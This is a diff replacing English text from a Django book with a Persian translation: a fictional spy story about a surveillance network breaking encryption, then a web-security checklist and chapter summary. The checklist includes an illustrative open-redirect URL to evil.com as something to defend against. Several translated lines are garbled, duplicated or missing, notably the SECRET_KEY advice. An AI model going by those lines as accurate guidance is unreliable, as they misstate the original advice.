+. پس از معرفی چک لیست ها، تعداد باگ های بی اهمیت به شدت کاهش یافت. ویژگی‌های اساسی که گنجاندن آنها 
+در نسخه غیرممکن بود از طریق همکاری اولیه با سرورهای 
+سرورهای مفیدی مانند Hexa و Aksel به کار گرفته شدند.
+
+به لطف کمپین بازاریابی درخشان سو، تعداد ثبت نام‌ها برای سایت بتا از 9000 گذشت.  
+استیو هرگز در دوران حرفه‌ای خود این همه علاقه برای راه اندازی ندیده بود
+آن موقع بود که متوجه چیز عجیبی در مورد روزنامه روی میزش شد.
     
-    He entered his cabin and opened his slide printouts once more. The
-    number of trivial bugs dropped sharply after the checklists were
-    introduced. Essential features that were impossible to include in the
-    release were worked out through early collaboration with helpful users,
-    such as Hexa and Aksel.
+پانزده دقیقه بعد، او با عجله از راهرو در طبقه 21 پایین آمد. در انتهای آن، 
+، دری با علامت 2109 وجود داشت. وقتی در را باز کرد، اوان را دید که
+روی چیزی شبیه یک لپ‌تاپ اسباب‌بازی پلاستیکی سفید کار می‌کرد. 
+استیو پرسید: "چرا سرنخ های جدول کلمات متقاطع را حلقه زدی؟
+می توانستی با من تماس بگیری."    
+
+    «او با پوزخند پاسخ داد: می خواهم چیزی به شما نشان دهم». لپ تاپش را گرفت و بیرون رفت.
+    او بین اتاق 2110 و خروجی آتش متوقف شد. روی زانوهایش افتاد و با دست راست
+    کاغذ دیواری رنگ و رو رفته را گرفت. او زمزمه کرد: "اینجا باید یک قفل وجود داشته باشد."
     
-    The number of signups for the beta site had crossed 9,000, thanks to Sue's
-    brilliant marketing campaign. Never in his career had Steve seen so much
-    interest for a launch. It was then that he noticed something odd about the
-    newspaper on his desk.
     
-    Fifteen minutes later, he rushed down the aisle in level 21. At the very
-    end, there was a door marked 2109. When he opened it, he saw Evan
-    working on what looked like a white plastic toy laptop. "Why did you
-    circle the crossword clues? You could have just called me," asked Steve.
+    سپس دستش ایستاد و دسته ای را که به سختی از دیوار بیرون زده بود چرخاند. 
+    قسمتی از دیوار چرخید و متوقف شد. ورودی اتاقی را نشان داد که با چراغ قرمز 
+    روشن شده بود. تابلویی در داخل که از پشت بام آویزان بود 
+    روی آن نوشته شده بود: «اتاق امن »21B.
     
-    "I want to show you something," he replied with a grin. He grabbed his
-    laptop and walked out. He stopped between room 2110 and the fire exit.
-    He fell on his knees and with his right hand, he groped the faded
-    wallpaper. "There has to be a latch here somewhere," he muttered.
+    وقتی وارد شدند، صفحات و چراغ‌های متعددی به خودی خود روشن شدند. 
+    یک صفحه نمایش بزرگ روی دیوار نوشته بود "احراز هویت لازم است. کلید را وارد کنید." 
+    ایوان برای مدت کوتاهی این را تحسین کرد و شروع به سیم کشی لپ تاپ خود کرد.
     
-    Then, his hand stopped and turned a handle barely protruding from the
-    wall. A part of the wall swiveled and came to a halt. It revealed an
-    entrance to a room lit with a red light. A sign inside dangling from the
-    roof said "Safe room 21B."
+    ایوان، ما اینجا چه کار می کنیم؟" استیو با صدایی خاموش پرسید. 
+    " ایوان ایستاد، "اوه، درست است. حدس می‌زنم تا پایان آزمایش‌ها کمی وقت داریم."
+    او یک نفس عمیق کشید.
     
-    As they entered, numerous screens and lights flicked on by themselves. A
-    large screen on the wall said "authentication required. Insert key." Evan
-    admired this briefly and began wiring up his laptop.
+    "به یاد دارید زمانی که خانم O از من خواست به پایگاه کد سنتینل نگاه کنم؟ 
+    من این کار را کردم. متوجه شدم که کد منبع سانسور شده به ما داده شده است. 
+    منظورم این است که می توانم برخی از رمزهای عبور را اینجا و آنجا حذف کنم، 
+    اما هزاران خط کد را درک کنم؟ مدام فکر می کردم - باید اتفاقی می افتاد."
     
-    "Evan, what are we doing here?" asked Steve in a hushed voice. Evan
-    stopped, "Oh, right. I guess we have some time before the tests finish." He
-    took a deep breath.
     
-    "Remember when Madam O wanted me to look into the Sentinel
-    codebase? I did. I realized that we were given censored source code. I
-    mean I can understand removing some passwords here and there, but
-    thousands of lines of code? I kept thinking-there had to be something
-    going on."
+    بنابراین، با دسترسی من به بایگانی، برخی از نسخه های پشتیبان قدیمی را برداشتم. 
+    " احتمال پاک نشدن یک رسانه مغناطیسی به طرز شگفت آوری زیاد است. 
+    به هر حال، من می توانم بیشتر کدهای پاک شده را بازیابی کنم. آنچه را دیدم باور نخواهید کرد. "
     
-    "So, with my access to the archiver, I pulled some of the older backups.
-    The odds of not erasing a magnetic medium are surprisingly high.
-    Anyways, I could recover most of the erased code. You won't believe what
-    I saw."
     
-    Sentinel was not an ordinary social network project. It was a surveillance
-    program. Perhaps the largest known to mankind.
+    Sentinel یک پروژه شبکه اجتماعی معمولی نبود. 
+    این یک برنامه نظارتی بود. شاید بزرگترین شناخته شده برای بشر.
     
-    Post-Cold War, a group of nations joined to form a network to share
-    intelligence information. A network of humans and sentinels. Sentinels
-    are semi-autonomous computers with unbelievable computing power.
-    Some believe they are quantum computers.
+    پس از جنگ سرد، گروهی از کشورها برای ایجاد شبکه ای 
+    برای اشتراک گذاری اطلاعات اطلاعاتی به یکدیگر پیوستند. شبکه ای از انسان ها
+    و نگهبانان. انتینل ها کامپیوترهایی نیمه مستقل با قدرت محاسباتی باورنکردنی هستند.
+    برخی معتقدند که آنها کامپیوترهای کوانتومی هستند.
     
-    Sentinels were inserted at thousands of strategic locations around the
-    world-mostly ocean beds where major fiber optic cables are passed.
-    Running on geothermal energy, they were self–powered and practically
-    indestructible. They had access to nearly every internet communication in
-    most countries.
+    نگهبان‌ها در هزاران مکان استراتژیک در سراسر بسترهای اقیانوسی جهان 
+    که کابل‌های اصلی فیبر نوری از آنجا عبور می‌کنند، قرار گرفتند.
+    آنها با انرژی زمین گرمایی کار می‌کردند، و عملاً غیرقابل تخریب بودند. 
+    آنها تقریباً به تمام ارتباطات اینترنتی در اکثر کشورها دسترسی داشتند.
     
-    At some point in the nineties, perhaps fearing public scrutiny, the Sentinel
-    program was shut down. This is where it gets really interesting. The code
-    history suggests that the development on Sentinels was continued by
-    someone named Cerebos. The code has been drastically enhanced from its
-    surveillance abilities to form a sort of massively parallel supercomputer. A
-    number-crunching beast for whom no encryption algorithm poses a
-    significant challenge.
+    در مقطعی در دهه نود، شاید از ترس نظارت عمومی، برنامه سنتینل تعطیل شد. 
+    اینجاست که واقعا جالب می شود. تاریخچه کد نشان می دهد که توسعه در Sentinels 
+    توسط شخصی به نام Cerebos ادامه یافت. این کد به طرز چشمگیری از توانایی های نظارتی 
+    خود برای ایجاد نوعی ابر رایانه موازی بسیار افزایش یافته است. یک جانور اعداد خرد کننده 
+    که هیچ الگوریتم رمزگذاری برای او چالش مهمی ایجاد نمی کند.
     
-    Remember the breach? I found it hard to believe that there was not a
-    single offensive move before the superheroes arrived. So, I did some
-    research. SHIM's cybersecurity is designed as five concentric rings. We,
-    the employees, are in the outermost, least privileged, ring protected by
-    Sauron. Inner rings are designed with increasingly stronger cryptographic
-    algorithms. This room is in level 4.
+    نقض را به یاد دارید؟ برای من سخت بود که باور کنم قبل از آمدن ابرقهرمانان 
+    حتی یک حرکت تهاجمی وجود نداشت. بنابراین، من کمی تحقیق کردم. 
+    امنیت سایبری SHIM به صورت پنج حلقه متحدالمرکز طراحی شده است. 
+    ما، کارمندان، در بیرونی ترین، کم برخوردارترین حلقه ای هستیم که توسط سائورون 
+    محافظت می شود. حلقه‌های داخلی با الگوریتم‌های رمزنگاری قوی‌تر طراحی می‌شوند. 
+    این اتاق در طبقه 4 است.
     
-    My guess is that long before we knew about the breach, all systems of
-    Sauron were already compromised. Systems were down and it was
-    practically a cakewalk for those robots to enter the campus. I just looked
-    at the logs. The attack was extremely targeted–everything from IP
-    addresses to logins were known beforehand.
+    حدس من این است که مدت‌ها قبل از اینکه ما از این رخنه مطلع شویم، همه 
+    سیستم‌های سائورون در معرض خطر قرار گرفته بودند. سیستم‌ها از کار افتاده بودند
+    و ورود آن روبات‌ها به محوطه دانشگاه عملاً یک راهپیمایی بود. من فقط به سیاهه ها نگاه کردم. 
+    این حمله بسیار هدفمند بود – همه چیز از آدرس های IP گرفته 
+    تا ورود به سیستم از قبل شناخته شده بود.
     
-    "Insider?" asked Steve in horror.
+    "داخلی?" استیو با وحشت پرسید.
     
-    "Yes. However, Sentinels needed help only for Level 5. Once they
-    acquired the public keys for Level 4, they began attacking Level 4 systems.
-    It sounds insane but that was their strategy."
+    بله. با این حال، Sentinels فقط برای سطح 5 نیاز به کمک داشت. 
+    " هنگامی که آنها کلیدهای عمومی برای سطح 4 را به دست آوردند،
+    آنها شروع به حمله به سیستم های سطح 4 کردند. این دیوانه به نظر
+    می رسد اما این استراتژی آنها بود."
+
+    "چرا دیوانه است؟"
     
-    "Why is it insane?"
+    "خب، بیشتر امنیت آنلاین جهان مبتنی بر رمزنگاری با کلید عمومی یا رمزنگاری
+    نامتقارن است. این امنیت مبتنی بر دو کلید است: یکی عمومی و دیگری خصوصی. 
+    اگرچه از نظر ریاضی مرتبط است، یافتن یک کلید در صورت داشتن
+    این کلید از نظر محاسباتی غیرعملی است. دیگر"
     
-    "Well, most of the world's online security is based on public-key
-    cryptography or asymmetric cryptography. It is based on two keys: one
-    public and the other private. Although mathematically related, it is
-    computationally impractical to find one key if you have the other."
+    "آیا می گویید که شبکه سنتینل می تواند؟"
     
-    "Are you saying that the Sentinel network can?"
+    "در واقع، آنها می توانند برای کلیدهای کوچکتر. بر اساس آزمایشاتی که در حال حاضر 
+    انجام می دهم، قدرت آنها به طور قابل توجهی افزایش یافته است. 
+    با این سرعت، آنها باید در کمتر از 24 ساعت برای حمله دیگری آماده شوند."
     
-    "In fact, they can for smaller keys. Based on the tests I am running right
-    now, their powers have grown significantly. At this rate, they should be
-    ready for another attack in less than 24 hours."
-    
-    "Damn, that's when SuperBook goes live!"
+    "لعنتی، آن زمان است که SuperBook پخش می شود!"
 
 </pre>
 
+### یک چک لیست امنیتی مفید
 
-### A handy security checklist
-Security is not an afterthought but is instead integral to the way you write applications.
-However, being human, it is handy to have a checklist to remind you of the common
-omissions.
+امنیت یک فکر بعدی نیست، بلکه در نحوه نوشتن برنامه ها ضروری است.
+با این حال، از آنجایی که انسان هستید، داشتن یک چک لیست برای یادآوری
+موارد مشترک مفید است.
 
-The following points are a bare minimum of security checks that you should perform
-before making your Django application public:
-- **Don't trust data from a browser, API, or any outside sources:** This is a
-  fundamental rule. Make sure that you validate and sanitize any outside data.
-- **Don't keep** SECRET_KEY **in version control:** As a best practice, pick **SECRET_KEY**
-  from the environment. Check out the `django-environ` package.
-- **Don't store passwords in plain text:** Store your application password hashes instead. Add a random salt as well.
-- **Don't log any sensitive data:** Filter out the confidential data, such as credit card details or API keys, before recording them in your log files.
-- **Any secure transaction or login should use SSL:** Be aware that eavesdroppers in
-the same network as you could listen to your web traffic if it is not in HTTPS.
-Ideally, you ought to use HTTPS for the entire site.
-- **Avoid using redirects to user-supplied URLs:** If you have redirects such as
-http://example.com/r?url=http://evil.com, then always check against
-whitelisted domains.
-- **Check authorization even for authenticated users:** Before performing any
-change with side effects, check whether the logged-in user is allowed to perform
-it.
-- **Use the strictest possible regular expressions:** Be it your `URLconf` or
-form validators, you must avoid lazy and generic regular expressions.
-- **Don't keep your Python code in web root:** This can lead to an accidental leak of
-source code if it gets served as plain text.
-- **Use Django templates instead of building strings by hand:** Templates have
-protection against XSS attacks.
-- **Use Django ORM rather than SQL commands:** The ORM offers protection
-against SQL injection.
-- **Use Django forms with POST input for any action with side effects:** It might
-seem like overkill to use forms for a simple vote button, but do it.
-- **CSRF should be enabled and used:** Be very careful if you are exempting certain
-views using the @csrf_exempt decorator.
-- **Ensure that Django and all packages are the latest versions:** Plan for updates.
-They might need some changes to be made to your source code. However, they
-bring shiny new features and security fixes too.
-- **Limit the size and type of user-uploaded files:** Allowing large file uploads can
-cause denial-of-service attacks. Deny uploading of executables or scripts.
-- **Have a backup and recovery plan:** Thanks to Murphy, you can plan for an
-inevitable attack, catastrophe, or any other kind of downtime. Make sure that
-you take frequent backups to minimize data loss.
+نکات زیر حداقلی از بررسی های امنیتی است که باید قبل از عمومی کردن برنامه جنگو خود انجام دهید:
 
-Some of these can be checked automatically using Erik's Pony Checkup
-at http://ponycheckup.com/. However, I would recommend that you print or copy this
-checklist and stick it on your desk.
+- **به داده های یک مرورگر، API یا هر منبع خارجی اعتماد نکنید:**
+  این یک قانون اساسی است. اطمینان حاصل کنید که هر گونه داده خارجی را تأیید و پاکسازی می کنید.
+- **نگه ندارید** کلید خصوصی را **در کنترل نسخه:** به عنوان بهترین تمرین، انتخاب کنید **کلید خصوصی**
+   پکیج `django-environ` را ببینید.
+- **رمزهای عبور را در متن ساده ذخیره نکنید:** در عوض هش رمز عبور برنامه خود را ذخیره کنید. یک نمک تصادفی نیز اضافه کنید.
+- **هیچ داده حساسی را ثبت نکنید:** اطلاعات محرمانه مانند جزئیات کارت اعتباری یا کلیدهای API را قبل از ثبت آنها در فایل های گزارش خود فیلتر کنید.
 
-Remember that this list is by no means exhaustive and not a substitute for a proper security
-audit by a professional.
+- **هر تراکنش امن یا ورود به سیستم باید از SSL استفاده کند:** آگاه باشید که استراق سمع کنندگان در
+  همان شبکه ای که اگر در HTTPS نباشد، می توانید به ترافیک وب خود گوش دهید.
+  در حالت ایده آل، شما باید از HTTPS برای کل سایت استفاده کنید.
+- **از استفاده از تغییر مسیر به URL های ارائه شده توسط کاربر خودداری کنید:** اگر ریدایرکت هایی مانند
+  http://example.com/r?url=http://evil.com, سپس همیشه دامنه های در لیست سفید را بررسی کنید.
 
-### Summary
-In this chapter, we looked at the common types of attacks affecting websites and web
-applications. In many cases, the explanation of the techniques has been simplified for
-clarity at the cost of detail. However, once we understand the severity of the attack, we can
-appreciate the countermeasures that Django provides.
+- **بررسی مجوز حتی برای کاربران احراز هویت شده:** قبل از انجام هر کدام
+  تغییر با عوارض جانبی، بررسی کنید که آیا کاربر وارد شده مجاز به انجام آن است یا خیر.
 
-In our final chapter, we will take a look at predeployment activities in more detail. We will
-also take a look at the various deployment strategies, such as cloud-based hosting for
-deploying a Django application.
+- **از دقیق ترین عبارات منظم ممکن استفاده کنید:**  
+  چه «URLconf» یا اعتبار سنجی‌های فرم شما، باید از عبارات منظم تنبل و عمومی اجتناب کنید.
+
+- **کد پایتون خود را در ریشه وب نگه ندارید:**
+  این می تواند منجر به نشت تصادفی کد منبع شود اگر به عنوان متن ساده ارائه شود.
+
+- **به جای ساختن رشته ها با دست از الگوهای جنگو استفاده کنید:**
+  قالب ها در برابر حملات XSS محافظت می کنند.
+
+- **از Django ORM به جای دستورات SQL استفاده کنید:**
+  ORM محافظت در برابر تزریق SQL را ارائه می دهد.
+
+- **از فرم های جنگو با ورودی POST برای هر اقدامی با عوارض جانبی استفاده کنید:**
+  ممکن است استفاده از فرم ها برای یک دکمه ساده رای زیاده روی به نظر برسد، اما این کار را انجام دهید.
+
+- **CSRF باید فعال و استفاده شود:**
+  اگر نماهای خاصی را با استفاده از دکوراتور @csrf_exempt معاف می کنید، بسیار مراقب باشید.
+
+- **اطمینان حاصل کنید که جنگو و همه بسته ها آخرین نسخه هستند:**
+  برای به روز رسانی برنامه ریزی کنید. آنها ممکن است نیاز به
+  تغییراتی در کد منبع شما داشته باشند. با این حال، آن‌ها ویژگی‌های جدید
+  درخشان و اصلاحات امنیتی را نیز به ارمغان می‌آورند.
+
+- **اندازه و نوع فایل های آپلود شده توسط کاربر را محدود کنید:**
+  بارگذاری فایل های اجرایی یا اسکریپت ها را رد کنید.
+  بارگذاری فایل های اجرایی یا اسکریپت ها را رد کنید.
+
+- **یک برنامه پشتیبان و بازیابی داشته باشید:**
+  به لطف مورفی، می توانید برای یک حمله اجتناب ناپذیر،
+  فاجعه یا هر نوع خرابی دیگری برنامه ریزی کنید. اطمینان حاصل کنید که
+  برای به حداقل رساندن از دست دادن داده ها، به طور مکرر نسخه پشتیبان تهیه می کنید.
+
+برخی از این موارد را می توان به طور خودکار با استفاده از Erik's Pony Checkup
+در http://ponycheckup.com/ بررسی کرد. با این حال، توصیه می کنم
+این چک لیست را پرینت یا کپی کنید و روی میز خود بچسبانید.
+
+به یاد داشته باشید که این لیست به هیچ وجه جامع نیست و جایگزینی
+برای ممیزی امنیتی مناسب توسط یک متخصص نیست.
+
+### خلاصه
+
+در این فصل، ما به انواع رایج حملاتی که بر وب سایت ها و برنامه های کاربردی
+وب تأثیر می گذارند نگاه کردیم. در بسیاری از موارد، توضیح تکنیک ها برای
+وضوح و به قیمت جزئیات ساده شده است. با این حال، هنگامی که ما شدت حمله را درک کنیم،
+می توانیم از اقدامات متقابلی که جنگو ارائه می دهد قدردانی کنیم.
+
+در فصل پایانی خود، نگاهی به فعالیت های پیش از استقرار با جزئیات بیشتر
+خواهیم داشت. ما همچنین نگاهی به استراتژی های مختلف استقرار، مانند
+میزبانی مبتنی بر ابر برای استقرار یک برنامه جنگو خواهیم داشت.
